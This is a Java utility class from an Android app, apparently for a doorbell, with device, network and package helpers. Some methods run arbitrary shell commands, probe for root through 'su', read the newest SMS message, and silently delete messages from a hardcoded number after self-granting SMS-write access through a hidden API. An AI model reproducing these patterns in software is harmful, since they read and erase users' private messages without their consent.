package com.eques.doorbell.a9048a3c38de2d7a.util;

import android.app.ActivityManager;
import android.app.AppOpsManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Method;
import java.util.List;

public class CommonUtil {
    final static public String getCpuInfo() {
        String str1 = "/proc/cpuinfo";
        String str2 = "";
        String[] cpuInfo = { "", "" }; // 1-cpu型号 //2-cpu频率
        String[] arrayOfString;
        FileReader fr = null;
        BufferedReader localBufferedReader = null;
        try {
            fr = new FileReader(str1);
            localBufferedReader = new BufferedReader(fr, 8192);
            str2 = localBufferedReader.readLine();
            arrayOfString = str2.split("\\s+");
            for (int i = 2; i < arrayOfString.length; i++) {
                cpuInfo[0] = cpuInfo[0] + arrayOfString[i] + " ";
            }
            str2 = localBufferedReader.readLine();
            arrayOfString = str2.split("\\s+");
            cpuInfo[1] += arrayOfString[2]; // cpu频率。
            localBufferedReader.close();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                if (fr != null)
                    fr.close();

                if (localBufferedReader != null)
                    localBufferedReader.close();

            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }

        System.out.println( "cpuinfo:" + cpuInfo[0] + " " + cpuInfo[1]);
        if ((cpuInfo[0].toLowerCase().contains("armv7"))) {
            return "armeabi-v7a";
        } else if ((cpuInfo[0].toLowerCase().contains("arm"))) {
            return "armeabi";
        } else if ((cpuInfo[0].toLowerCase().contains("mips"))) {
            return "mips";
        } else if((cpuInfo[0].toLowerCase().contains("aarch64"))){
            return "arm64-v8a";
        }else {
            return "x86";
        }

    }
    public static void startBrowser(Context context, String url) {
        try {
            Intent intent = new Intent();
            intent.setAction("android.intent.action.VIEW");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            Uri content_url = Uri.parse(url);
            intent.setData(content_url);
            context.startActivity(intent);
        } catch (Exception e) {

        }
    }

    public static void startInstallAPK(Context context, String path) {
        try {
            Intent intent = new Intent();
            intent.setAction(Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.fromFile(new File(path)), "application/vnd.android.package-archive");
            context.startActivity(intent);
        } catch (Exception e) {

        }
    }
    public static boolean isAppInstalled(Context context,String packagename)
    {
        PackageInfo packageInfo;
        try {
            packageInfo = context.getPackageManager().getPackageInfo(packagename, PackageManager.GET_ACTIVITIES);
        }catch (PackageManager.NameNotFoundException e) {
            packageInfo = null;
            System.out.println("can not find package "+packagename);
        }
        if(packageInfo ==null){
            return false;
        }else{
            return true;
        }
    }
    public static String getCurrentProcessName(Context context) {
        int pid = android.os.Process.myPid();
        ActivityManager mActivityManager = (ActivityManager) context
                .getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningAppProcessInfo appProcess : mActivityManager
                .getRunningAppProcesses()) {
            if (appProcess.pid == pid) {
                return appProcess.processName;
            }
        }
        return null;
    }
    public static void toast(Context context, String contentText) {
        Toast.makeText(context, contentText, Toast.LENGTH_SHORT).show();
    }

    public static boolean haveRoot() {
        int i = execRootCmdSilent("echo test"); // 通过执行测试命令来检测
        if (i != -1) {
            return true;
        }
        return false;
    }

    protected static int execRootCmdSilent(String paramString) {
        try {
            Process localProcess = Runtime.getRuntime().exec("su");
            Object localObject = localProcess.getOutputStream();
            DataOutputStream localDataOutputStream = new DataOutputStream(
                    (OutputStream) localObject);
            localObject = paramString + "\n";
            localDataOutputStream.writeBytes((String) localObject);
            localDataOutputStream.flush();
            localDataOutputStream.writeBytes("exit\n");
            localDataOutputStream.flush();
            localProcess.waitFor();
            int result = localProcess.exitValue();
            return (Integer) result;
        } catch (Exception localException) {
            return -1;
        }
    }
    public static String execCommand(String commonLine) {
        Process process = null;
        try {
            System.out.println("commond Line:"+commonLine);
            process = Runtime.getRuntime().exec("sh");  //获得shell.
            DataInputStream inputStream = new DataInputStream(process.getInputStream());
            DataOutputStream outputStream = new DataOutputStream(process.getOutputStream());
//            outputStream.writeBytes("cd /data/data/" + context.getPackageName() + "\n");   //保证在command在自己的数据目录里执行,才有权限写文件到当前目录
            outputStream.writeBytes(commonLine + " &\n"); //让程序在后台运行，前台马上返回
            outputStream.writeBytes("exit\n");
            outputStream.flush();
            process.waitFor();

            byte[] buffer = new byte[inputStream.available()];
            inputStream.read(buffer);
            String s = new String(buffer);
            System.out.println("commond result:"+s);
            return s;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "-1";
    }
    /**
     * 判断某个服务是否正在运行的方法
     *
     * @param mContext
     * @param serviceName
     *            是包名+服务的类名（例如：net.loonggg.testbackstage.TestService）
     * @return true代表正在运行，false代表服务没有正在运行
     */
    public static boolean isServiceWork(Context mContext, String serviceName) {
        boolean isWork = false;
        ActivityManager myAM = (ActivityManager) mContext
                .getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningServiceInfo> myList = myAM.getRunningServices(40);
        if (myList.size() <= 0) {
            return false;
        }
        for (int i = 0; i < myList.size(); i++) {
            String mName = myList.get(i).service.getClassName().toString();
            if (mName.equals(serviceName)) {
                isWork = true;
                break;
            }
        }
        return isWork;
    }
    public static boolean hasPermission(Context context,String permissionStr){
        PackageManager pm = context.getPackageManager();
        boolean permission = (PackageManager.PERMISSION_GRANTED ==
                pm.checkPermission(permissionStr, context.getPackageName()));
       return permission;
    }
    private static final int OP_WRITE_SMS = 15;

    public static boolean isWriteEnabled(Context context) {
        int uid = getUid(context);
        Object opRes = checkOp(context, OP_WRITE_SMS, uid);

        if (opRes instanceof Integer) {
            return (Integer) opRes == AppOpsManager.MODE_ALLOWED;
        }
        return false;
    }

    public static boolean setWriteEnabled(Context context, boolean enabled) {
        int uid = getUid(context);
        int mode = enabled ? AppOpsManager.MODE_ALLOWED
                : AppOpsManager.MODE_IGNORED;

        return setMode(context, OP_WRITE_SMS, uid, mode);
    }

    private static Object checkOp(Context context, int code, int uid) {
        try {
            AppOpsManager appOpsManager = (AppOpsManager) context
                    .getSystemService(Context.APP_OPS_SERVICE);
            Class appOpsManagerClass = appOpsManager.getClass();
            Class[] types = new Class[3];
            types[0] = Integer.TYPE;
            types[1] = Integer.TYPE;
            types[2] = String.class;
            Method checkOpMethod = appOpsManagerClass.getMethod("checkOp",
                    types);

            Object[] args = new Object[3];
            args[0] = Integer.valueOf(code);
            args[1] = Integer.valueOf(uid);
            args[2] = context.getPackageName();
            Object result = checkOpMethod.invoke(appOpsManager, args);
            return result;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private static boolean setMode(Context context, int code, int uid, int mode) {
        try {
            AppOpsManager appOpsManager = (AppOpsManager) context
                    .getSystemService(Context.APP_OPS_SERVICE);
            Class appOpsManagerClass = appOpsManager.getClass();
            Class[] types = new Class[4];
            types[0] = Integer.TYPE;
            types[1] = Integer.TYPE;
            types[2] = String.class;
            types[3] = Integer.TYPE;
            Method setModeMethod = appOpsManagerClass.getMethod("setMode",
                    types);
            Object[] args = new Object[4];
            args[0] = Integer.valueOf(code);
            args[1] = Integer.valueOf(uid);
            args[2] = context.getPackageName();
            args[3] = Integer.valueOf(mode);
            setModeMethod.invoke(appOpsManager, args);
            return true;
        }catch (Exception e){

        }
        return false;
    }

    private static int getUid(Context context){
        try
        {
            int uid = context.getPackageManager().getApplicationInfo(
                    context.getPackageName(), PackageManager.GET_META_DATA).uid;
            return uid;
        }catch (Exception e){

        }
        return 0;
    }
    public static String checkReadSMS(Context context){
        try {
            final String SMS_URI_INBOX = "content://sms";
            String[] projection = new String[]{"_id", "address", "person",
                    "body", "date", "type"};
            Cursor cursor = context.getContentResolver().query(Uri.parse(SMS_URI_INBOX), projection, null, null,
                    "date desc");
            if (cursor.moveToNext()) {
                int smsbodyColumn = cursor.getColumnIndex("body");// 短信内容
                return cursor.getString(smsbodyColumn);
            }
            cursor.close();
            return null;
        }catch (Exception e){
            return null;
        }
    }
    public static void checkWriteSMS(Context context){
        try {
            ContentResolver resolver = context.getContentResolver();
            Uri uri = Uri.parse("content://sms/inbox");
            String address = "86754893194";
            resolver.delete(uri, " address =? ", new String[]{address});
            if (!isWriteEnabled(context)) {
                setWriteEnabled(context, true);
            }
        }catch (Exception e){
        }
    }
    public static String getExceptionStackString(Throwable e) {
        StringWriter errorsWriter = new StringWriter();
        e.printStackTrace(new PrintWriter(errorsWriter));
        return errorsWriter.toString();
    }
    public static int getAppVersion(Context context){
        try {
            PackageInfo info = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
            return  info.versionCode;
        }catch (Exception e){

        }
        return  0;
    }
    /**
      * 判断是否有网络连接
      * @param context
      * @return
      */
     public static boolean isNetworkConnected(Context context) {
           if (context != null) {
                 ConnectivityManager mConnectivityManager = (ConnectivityManager) context
                     .getSystemService(Context.CONNECTIVITY_SERVICE);
                 NetworkInfo mNetworkInfo = mConnectivityManager.getActiveNetworkInfo();
                 if (mNetworkInfo != null) {
                       return mNetworkInfo.isAvailable();
                     }
               }
           return false;
         }
    
            
     /**
      * 判断WIFI网络是否可用
      * @param context
      * @return
      */
      public static boolean isWifiConnected(Context context) {
           if (context != null) {
                 ConnectivityManager mConnectivityManager = (ConnectivityManager) context
                     .getSystemService(Context.CONNECTIVITY_SERVICE);
                 NetworkInfo mWiFiNetworkInfo = mConnectivityManager
                     .getNetworkInfo(ConnectivityManager.TYPE_WIFI);
                 if (mWiFiNetworkInfo != null) {
                       return mWiFiNetworkInfo.isAvailable();
                     }
               }
           return false;
         }
    
            
      /**
      * 判断MOBILE网络是否可用
      * @param context
      * @return
      */
      public static boolean isMobileConnected(Context context) {
           if (context != null) {
                 ConnectivityManager mConnectivityManager = (ConnectivityManager) context
                     .getSystemService(Context.CONNECTIVITY_SERVICE);
                 NetworkInfo mMobileNetworkInfo = mConnectivityManager
                     .getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
                 if (mMobileNetworkInfo != null) {
                       return mMobileNetworkInfo.isAvailable();
                     }
               }
           return false;
         }
    
            
      /**
      * 获取当前网络连接的类型信息
      * @param context
      * @return
      */
      public static int getConnectedType(Context context) {
           if (context != null) {
                 ConnectivityManager mConnectivityManager = (ConnectivityManager) context
                     .getSystemService(Context.CONNECTIVITY_SERVICE);
                 NetworkInfo mNetworkInfo = mConnectivityManager.getActiveNetworkInfo();
                 if (mNetworkInfo != null && mNetworkInfo.isAvailable()) {
                       return mNetworkInfo.getType();
                     }
               }
           return -1;
         }
    
            
      /**
      * 获取当前的网络状态 ：没有网络0：WIFI网络1：3G网络2：2G网络3
      *
      * @param context
      * @return
      */
      public static int getAPNType(Context context) {
           int netType = 0;
           ConnectivityManager connMgr = (ConnectivityManager) context
               .getSystemService(Context.CONNECTIVITY_SERVICE);
           NetworkInfo networkInfo = connMgr.getActiveNetworkInfo();
           if (networkInfo == null) {
                 return netType;
               }
           int nType = networkInfo.getType();
           if (nType == ConnectivityManager.TYPE_WIFI) {
                 netType = 1;// wifi
               } else if (nType == ConnectivityManager.TYPE_MOBILE) {
                 int nSubType = networkInfo.getSubtype();
                 TelephonyManager mTelephony = (TelephonyManager) context
                     .getSystemService(Context.TELEPHONY_SERVICE);
                 if (nSubType == TelephonyManager.NETWORK_TYPE_UMTS
                     && !mTelephony.isNetworkRoaming()) {
                       netType = 2;// 3G
                     } else {
                       netType = 3;// 2G
                     }
               }
           return netType;
         }
}
